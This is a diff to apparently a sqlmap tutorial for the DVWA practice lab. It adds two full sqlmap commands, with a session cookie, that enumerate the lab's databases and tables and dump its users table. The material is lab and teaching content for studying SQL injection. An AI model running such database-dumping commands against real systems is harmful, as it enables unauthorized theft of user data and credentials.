@@ -31,3 +31,7 @@ database management system users [1]:
 
 1. Get cookie
 2. ./sqlmap.py -u "https://sqlmap-dungdt.c9users.io/DVWA-1.9/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=arkk9hvnd6hi86uefdv1vrsts0; security=low"
+3. Get Data
+
+    * `./sqlmap.py -u "https://sqlmap-dungdt.c9users.io/DVWA-1.9/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=arkk9hvnd6hi86uefdv1vrsts0; security=low" --dbs --tables`
+    * `./sqlmap.py -u "https://sqlmap-dungdt.c9users.io/DVWA-1.9/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=arkk9hvnd6hi86uefdv1vrsts0; security=low" -D dvwa -T users --dump`
